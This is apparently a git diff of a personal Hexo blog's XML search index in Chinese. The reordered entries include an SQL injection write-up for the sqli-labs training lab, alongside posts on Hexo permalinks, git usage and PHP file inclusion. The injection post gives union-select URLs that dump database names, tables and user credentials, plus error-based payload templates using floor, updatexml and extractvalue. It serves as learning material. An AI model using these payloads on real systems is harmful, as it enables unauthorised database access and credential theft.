-<p>2.使id=1’–+</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHirnJ.png" alt="BHirnJ.png"></p>
-<p>但是输入id=1’) –+页面回显正常，说明此处是字符型注入，而且以(‘’)的方式闭合字符串</p>
-<p>3.接着使用order by判断表中有3列数据</p>
-<p>4.使用联合查询union select 1,2,3判断是有回显位，回显位是2,3</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHiG0s.png" alt="BHiG0s.png"></p>
-<p>5.爆出库名是security</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHitkq.png" alt="BHitkq.png"></p>
-<p>列出security库中所有的表名</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHiJ7n.png" alt="BHiJ7n.png"></p>
-<p>列出users表中所有的列名</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHidpT.png" alt="BHidpT.png"></p>
-<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>与之前的都类似，先判断这一关是(“”)闭合异常</p>
-<p>1.输入id=1，页面回显正常</p>
-<p>2.输入id=1“–+，页面回显不正常</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHi0cF.png" alt="BHi0cF.png"></p>
-<p>3.进行和第三关一样的步骤</p>
-<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>这一关输入id=3时发现页面回显是you are in…</p>
-<p>可见是布尔型注入，它并不能正常显示内容，正确回显只会显示you are in…，错误就不显示，所以无法用order by查看显示位</p>
-<p>1.输入id=1</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHiBX4.png" alt="BHiBX4.png"></p>
-<p>2.输入id=1‘</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHirnJ.png" alt="BHirnJ.png"></p>
-<p>页面显示sql语句错误，在这里进行新的注入方式：报错注入</p>
-<p>以下三种常用的语句：</p>
-<p><strong>payload</strong>是我们要输入的sql查询语句</p>
-<p>a.通过floor报错</p>
-<p><code>and (select 1 from (select count(*),concat(( **payload**),floor (rand(0)*2))x from information_schema.tables group by x)a)</code></p>
-<p>其中payload为你要插入的SQL语句</p>
-<p>需要注意的是该语句将 输出字符长度限制为64个字符</p>
-<p>b.通过updatexml报错</p>
-<p>and updatexml(1, <strong>payload</strong>,1)</p>
-<p>同样该语句对输出的字符长度也做了限制，其最长输出32位</p>
-<p>并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
-<p>c.通过ExtractValue报错</p>
-<p>通过ExtractValue报错</p>
-<p>and extractvalue(1, <strong>payload</strong>)</p>
-<p>输出字符有长度限制，最长32位。</p>
-]]></content>
-      <categories>
-        <category>网络安全知识学习</category>
-      </categories>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python基础</title>
     <url>/post/81b2f4bf.html</url>
     <content><![CDATA[<p>　　基本了解Python能读懂别人的程序<a id="more"></a></p>
@@ -2533,6 +2420,119 @@
       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入学习</title>
+    <url>/post/6d789c72.html</url>
+    <content><![CDATA[<p>　　这个漏洞以后再写项目的时候必须注意<a id="more"></a></p>
+<h1 id="SQLI-Labs简介"><a href="#SQLI-Labs简介" class="headerlink" title="SQLI-Labs简介"></a>SQLI-Labs简介</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>　　通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<h2 id="2-sql注入类型"><a href="#2-sql注入类型" class="headerlink" title="2.sql注入类型"></a>2.sql注入类型</h2><p>按照注入点类型来分类</p>
+<h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>sql语句为<code>select * from table_name where id = x</code></p>
+<p>这种类型可以使用and 1=1 和 and 1=2判断：</p>
+<p>​        1.url地址中输入id=x and 1=1页面正常回显</p>
+<p>​        2.url地址中输入id=x and 1=2页面回显不正常，则属于该类型</p>
+<p>原因：</p>
+<p>当输入and 1=1时，执行的sql语句：<code>selece * from table_name where id=x and 1=1</code>，没有逻辑错误，返回正常</p>
+<p>当输入and 1=2时，执行的sql语句：<code>selece * from table_name where id=x and 1=2</code></p>
+<p>如果是字符型注入，则应该是以下情况</p>
+<p>1）<code>selece * from table_name where &#39;id=x and 1=1&#39;</code></p>
+<p>2）<code>selece * from table_name where &#39;id=x and 1=2&#39;</code></p>
+<p>引号里面的被转换为字符串，没有进行逻辑判断，不会出现上述结果，所以这种情况不成立。</p>
+<h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>　　当输入的参数x为字符型时，执行的sql语句：<code>select * from table_name where id=&#39;x&#39;</code></p>
+<p>同样可以用and ‘1’=’1和and ‘1’=’2判断：</p>
+<p>​        1.url地址输入id=x’ and ‘1’=’1页面正常，继续下一步</p>
+<p>​        2.url地址中继续输入id=x’ and ‘1’=’2页面错误，则为字符型注入</p>
+<p>原因：</p>
+<p>当输入id=x’ and ‘1’=’1时，执行的sql语句：<code>select * from table_name where id=&#39;x&#39; and &#39;1&#39;=&#39;1&#39;</code></p>
+<p>语法正确，逻辑正确，所以返回正确</p>
+<p>当输入and ‘1’=’2，执行的sql语句：<code>select * from table_name where id=&#39;x&#39; and &#39;1&#39;=&#39;2&#39;</code></p>
+<p>语法正确，但是逻辑判断错误</p>
+<h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>　　这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code>。</p>
+<p>组合出来的sql注入语句为：<code>select * from news where search like &#39;%测试 %&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>
+<p>测试%’ union select 1,2,3,4 and ‘%’=’</p>
+<p>按照数据提交的方式来分类</p>
+<p>（1）GET 注入</p>
+<p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
+<p>（2）POST 注入</p>
+<p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
+<p>（3）Cookie 注入</p>
+<p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
+<p>（4）HTTP 头部注入</p>
+<p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
+<p>按照执行效果来分类</p>
+<p>（1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p>
+<p>（2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
+<p>（3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p>*（4）联合查询注入，可以使用union的情况下的注入。</p>
+<p>*（5）堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+<h1 id="SQLI-LABS学习"><a href="#SQLI-LABS学习" class="headerlink" title="SQLI-LABS学习"></a>SQLI-LABS学习</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首先说一下我在学习过程中经常弄混淆的一些单词</p>
+<p>table_schema：数据库名</p>
+<p>information_schema.schemata：所有的数据库中</p>
+<p>information_schema.tables：该数据库中的所有表</p>
+<p>information_schema.column：该表中的所有列</p>
+<p>table_name：表名</p>
+<p>column_name：列名</p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>– （这里有一个空格）在sql语句中表示注释，但是在url中，如果在最后一行加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用–+代替，因为+在URL被编码后会变成空格。</p>
+<p>1.输入<code>http://127.0.0.1/sqli/Less-1/?id=1</code>，页面回显正常，所以改地方不是数值查询。<br><img src="https://img-blog.csdnimg.cn/20201027175301124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>2.在id后面加上’，页面回显不正常，可能存在字符注入<br><img src="https://img-blog.csdnimg.cn/20201027175440385.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>3.输入–+将sql后面的语句注释掉，页面回显正常，说明是单引号字符型注入<br><img src="https://img-blog.csdnimg.cn/20201027175502223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>4.接着使用order by语句判断该数据库有几列输入，order by 4、order by 5、order by 6···页面都回显错误，只有order by 3正常，说明该表有3列<br><img src="https://img-blog.csdnimg.cn/20201027175622660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>5.将id=1改成id=-1，然后使用union select 1,2,3联合查询语句查询是否有显示位。显示2和3，表明有2个显示位，说明第2列和第3列可以显示信息。<br><img src="https://img-blog.csdnimg.cn/20201027180119978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>6.然后利用sql查询语句爆破出数据库的库名，表名，列名，字段信息：<br>库名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182524974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>表名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code><br>这里0x7365637572697479是查询的库名security的16进制<br><img src="https://img-blog.csdnimg.cn/20201027182008418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>users表中的列名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182640634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>接着使用一下语句查询账号密码<br><code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users--+ </code><br><img src="https://img-blog.csdnimg.cn/20201027182951559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>第二关和第一关是一个类型的</p>
+<p>1.输入id=1回显正常</p>
+<p>2.id=1’出错，可以见是单引号闭合出错</p>
+<p>3.之后继续按照第一关的步骤进行爆破信息</p>
+<h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p>1.和之前一样输入</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHiUhV.png" alt="BHiUhV.png"></p>
+<p>2.使id=1’–+</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHirnJ.png" alt="BHirnJ.png"></p>
+<p>但是输入id=1’) –+页面回显正常，说明此处是字符型注入，而且以(‘’)的方式闭合字符串</p>
+<p>3.接着使用order by判断表中有3列数据</p>
+<p>4.使用联合查询union select 1,2,3判断是有回显位，回显位是2,3</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHiG0s.png" alt="BHiG0s.png"></p>
+<p>5.爆出库名是security</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHitkq.png" alt="BHitkq.png"></p>
+<p>列出security库中所有的表名</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHiJ7n.png" alt="BHiJ7n.png"></p>
+<p>列出users表中所有的列名</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHidpT.png" alt="BHidpT.png"></p>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>与之前的都类似，先判断这一关是(“”)闭合异常</p>
+<p>1.输入id=1，页面回显正常</p>
+<p>2.输入id=1“–+，页面回显不正常</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHi0cF.png" alt="BHi0cF.png"></p>
+<p>3.进行和第三关一样的步骤</p>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>这一关输入id=3时发现页面回显是you are in…</p>
+<p>可见是布尔型注入，它并不能正常显示内容，正确回显只会显示you are in…，错误就不显示，所以无法用order by查看显示位</p>
+<p>1.输入id=1</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHiBX4.png" alt="BHiBX4.png"></p>
+<p>2.输入id=1‘</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHirnJ.png" alt="BHirnJ.png"></p>
+<p>页面显示sql语句错误，在这里进行新的注入方式：报错注入</p>
+<p>以下三种常用的语句：</p>
+<p><strong>payload</strong>是我们要输入的sql查询语句</p>
+<p>a.通过floor报错</p>
+<p><code>and (select 1 from (select count(*),concat(( **payload**),floor (rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+<p>其中payload为你要插入的SQL语句</p>
+<p>需要注意的是该语句将 输出字符长度限制为64个字符</p>
+<p>b.通过updatexml报错</p>
+<p>and updatexml(1, <strong>payload</strong>,1)</p>
+<p>同样该语句对输出的字符长度也做了限制，其最长输出32位</p>
+<p>并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
+<p>c.通过ExtractValue报错</p>
+<p>通过ExtractValue报错</p>
+<p>and extractvalue(1, <strong>payload</strong>)</p>
+<p>输出字符有长度限制，最长32位。</p>
+]]></content>
+      <categories>
+        <category>网络安全知识学习</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
       </tags>
   </entry>
   <entry>
@@ -3039,6 +3039,18 @@
       </categories>
   </entry>
   <entry>
+    <title>博客文章链接优化</title>
+    <url>/post/341885c6.html</url>
+    <content><![CDATA[<p>　　hexo的默认永久链接在_config.yml里的配置permalink: :year/:month/:day/:title，这种链接会掺杂中文路径，导致url中出现中文，并不能够分享。<a id="more"></a></p>
+<h1 id="安装hexo-abbrlink插件"><a href="#安装hexo-abbrlink插件" class="headerlink" title="安装hexo-abbrlink插件"></a>安装hexo-abbrlink插件</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-abbrlink <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在_config.yml文件中修改permalink</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">post/:abbrlink.html</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="comment"># 算法：crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span>  </span><br><span class="line">  <span class="comment"># 进制：dec(default) and hex</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">hex</span>    </span><br></pre></td></tr></table></figure>
+
+<p>之后使用hexo clean清除静态文件，再使用hexo d -g重新生成静态文件，会自动在文章中加上abbrlink: ba5852c2</p>
+]]></content>
+  </entry>
+  <entry>
     <title>小程序开发</title>
     <url>/post/8d10680e.html</url>
     <content><![CDATA[<p>　　2020年寒假在培训的时候记录的小程序项目<a id="more"></a></p>
@@ -3055,18 +3067,6 @@
       <tags>
         <tag>小程序</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>博客文章链接优化</title>
-    <url>/post/341885c6.html</url>
-    <content><![CDATA[<p>　　hexo的默认永久链接在_config.yml里的配置permalink: :year/:month/:day/:title，这种链接会掺杂中文路径，导致url中出现中文，并不能够分享。<a id="more"></a></p>
-<h1 id="安装hexo-abbrlink插件"><a href="#安装hexo-abbrlink插件" class="headerlink" title="安装hexo-abbrlink插件"></a>安装hexo-abbrlink插件</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-abbrlink <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
-
-<p>然后在_config.yml文件中修改permalink</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">post/:abbrlink.html</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="comment"># 算法：crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span>  </span><br><span class="line">  <span class="comment"># 进制：dec(default) and hex</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">hex</span>    </span><br></pre></td></tr></table></figure>
-
-<p>之后使用hexo clean清除静态文件，再使用hexo d -g重新生成静态文件，会自动在文章中加上abbrlink: ba5852c2</p>
-]]></content>
   </entry>
   <entry>
     <title>常见的密码类型</title>
@@ -3118,6 +3118,83 @@
       </categories>
   </entry>
   <entry>
+    <title>提交代码到GitHub</title>
+    <url>/post/a2535634.html</url>
+    <content><![CDATA[<p>　　如何将Idea里面创建的项目提交到GitHub，在Gitee上操作大同小异。<a id="more"></a></p>
+<p>在开始之前，我们需要在在本地创建一个文件夹，用来保存以后从github上拉去的仓库。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617005004-GIt%E6%93%8D%E4%BD%9C3.jpg" alt="GIt操作3"></p>
+<p>然后，需要在Github新建一个仓库，用来保存项目代码，名字最好和IDEA项目的名字保持一致。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004625-GIt%E6%93%8D%E4%BD%9C1.jpg" alt="GIt操作1"></p>
+<p>可以看到上面的仓库链接，</p>
+<p>执行<code>git clone https://github.com/qnjy/finance_demo.git</code>命令，将仓库克隆到本地。需要现在GitLocalRepo文件夹下右键点击Git Bash Here。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004581-GIt%E6%93%8D%E4%BD%9C4.jpg" alt="GIt操作4"></p>
+<p>本地就会出现一个以仓库命名的文件夹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004577-GIt%E6%93%8D%E4%BD%9C5.jpg" alt="GIt操作5"></p>
+<p>点开将.git文件夹复制到IDEA的项目里面，注意：如果看不到.git文件夹，就点击上方的查看-&gt;勾选已隐藏的项目</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004573-GIt%E6%93%8D%E4%BD%9C6.jpg" alt="GIt操作6"></p>
+<p>使用IDEA打开项目，首先将IDEA终端设置为bash.exe，这个方便我们以后执行git命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004569-GIt%E6%93%8D%E4%BD%9C7.jpg" alt="GIt操作7"></p>
+<p>执行<code>git status</code>查看文件的状态</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004565-GIt%E6%93%8D%E4%BD%9C8.jpg" alt="GIt操作8"></p>
+<p>然后<code>git add .</code>添加文件到所有缓存区</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004562-GIt%E6%93%8D%E4%BD%9C.jpg" alt="GIt操作"></p>
+<p>之后<code>git commit -m &quot;第一次提交&quot;</code>将缓存区的内容提交到本地仓库</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004553-GIt%E6%93%8D%E4%BD%9C10.jpg" alt="GIt操作10"></p>
+<p>最后<code>git push</code>到远程仓库</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004547-GIt%E6%93%8D%E4%BD%9C11.jpg" alt="GIt操作11"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004542-GIt%E6%93%8D%E4%BD%9C12.jpg" alt="GIt操作12"></p>
+<p><strong>Git文件操作</strong></p>
+<blockquote>
+<p>文件的四种状态</p>
+</blockquote>
+<p>版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。</p>
+<ul>
+<li><p>Untracked: 未跟踪, 此文件在文件夹中, 但并没有加入到git库, 不参与版本控制. 通过git add 状态变为Staged.</p>
+</li>
+<li><p>Unmodify: 文件已经入库, 未修改, 即版本库中的文件快照内容与文件夹中完全一致. 这种类型的文件有两种去处, 如果它被修改, 而变为Modified. 如果使用git rm移出版本库, 则成为Untracked文件</p>
+</li>
+<li><p>Modified: 文件已修改, 仅仅是修改, 并没有进行其他的操作. 这个文件也有两个去处, 通过git add可进入暂存staged状态, 使用git checkout 则丢弃修改过, 返回到unmodify状态, 这个git checkout即从库中取出文件, 覆盖当前修改 !</p>
+</li>
+<li><p>Staged: 暂存状态. 执行git commit则将修改同步到库中, 这时库中的文件和本地文件又变为一致, 文件为Unmodify状态. 执行git reset HEAD filename取消暂存, 文件状态为Modified</p>
+</li>
+</ul>
+<blockquote>
+<p>查看文件状态</p>
+</blockquote>
+<p>上面说文件有4种状态，通过如下命令可以查看到文件的状态：</p>
+<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#查看指定文件状态</span></span><br><span class="line">git status [filename]</span><br><span class="line"><span class="meta">#查看所有文件状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta"># git add .                  添加所有文件到暂存区</span></span><br><span class="line"><span class="meta"># git commit -m &quot;消息内容&quot;    提交暂存区中的内容到本地仓库 -m 提交信息</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>忽略文件</p>
+</blockquote>
+<p>有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等</p>
+<p>在主目录下建立”.gitignore”文件，此文件有如下规则：</p>
+<ol>
+<li><p>忽略文件中的空行或以井号（#）开始的行将会被忽略。</p>
+</li>
+<li><p>可以使用Linux通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等</p>
+</li>
+<li><p>如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。</p>
+</li>
+<li><p>如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在根目录下，而根目录的子目录中的文件不忽略。</p>
+</li>
+<li><p>如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。</p>
+</li>
+</ol>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#为注释</span></span><br><span class="line">*.txt         <span class="comment">#忽略所有 .txt结尾的文件,这样的话上传就不会被选中！</span></span><br><span class="line">!lib.txt       <span class="comment">#但lib.txt除外</span></span><br><span class="line">/temp        <span class="comment">#仅忽略项目根目录下的TODO文件,不包括其它目录</span></span><br><span class="line">build<span class="regexp">/        #忽略build/</span>目录下的所有文件</span><br><span class="line">doc<span class="regexp">/*.txt     #会忽略 doc/</span>notes.txt 但不包括 doc<span class="regexp">/server/</span>arch.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>git分支操作</strong></p>
+<p>git常用分支命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004511-GIt%E6%93%8D%E4%BD%9C13.png" alt="GIt操作13"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 列出所有本地分支</span></span><br><span class="line">git branch</span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出所有远程分支</span></span><br><span class="line">git branch -r</span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个分支，但依然停留在当前分支</span></span><br><span class="line">git branch [branch-name]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个分支，并切换到该分支</span></span><br><span class="line">git checkout -b [branch]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 合并指定分支到当前分支$ </span></span><br><span class="line">git merge [branch]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除分支$ </span></span><br><span class="line">git branch -d [branch-name]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除远程分支</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin --delete [branch-name]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -dr [remote/branch]</span></span><br></pre></td></tr></table></figure>
+
+<p>IDEA操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004531-GIt%E6%93%8D%E4%BD%9C12.jpg" alt="GIt操作12"></p>
+<p>如果同一个文件在合并分支时都被修改了则会引起冲突：解决的办法是我们可以修改冲突文件后重新提交！选择要保留他的代码还是你的代码！</p>
+<p>master主分支应该非常稳定，用来发布新版本，一般情况下不允许在上面工作，工作一般情况下在新建的dev分支上工作，工作完后，比如上要发布，或者说dev分支代码稳定后可以合并到主分支master上来。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>房租管理系统</title>
     <url>/post/cedff539.html</url>
     <content><![CDATA[<p>　　在学校的三级课题实训期间，跟着做的一个基于servlet的项目，通过前后端传实现的增删改查<a id="more"></a></p>
@@ -3140,72 +3217,6 @@
       <categories>
         <category>JavaWeb项目</category>
       </categories>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/post/4089de4e.html</url>
-    <content><![CDATA[<p>　　网络安全内容方面的学习，了解了网站的文件包含漏洞<a id="more"></a></p>
-<h1 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h1><p>　　php文件包含漏洞的产生原因是在通过php的函数引入文件时，使用了预想之外的文件，就可能导致文件泄露甚至恶意代码的注入。</p>
-<h1 id="PHP文件包含的函数"><a href="#PHP文件包含的函数" class="headerlink" title="PHP文件包含的函数"></a>PHP文件包含的函数</h1><h2 id="1-四种函数理解"><a href="#1-四种函数理解" class="headerlink" title="1.四种函数理解"></a>1.四种函数理解</h2><p>创建inc.php文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>创建include.php文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is include.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>创建include_once.php文件，但是调用同一文件只调用第一次</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;./inc.php&quot;</span>);<span class="comment">//包含inc文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is include_once.php&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;./inc.php&quot;</span>;<span class="comment">//包含inc文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>创建require.php文件，如果包含失败，会报出错误信息，并终止脚本运行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>创建require_once.php文件，功能和require一样，但是只包含一次</p>
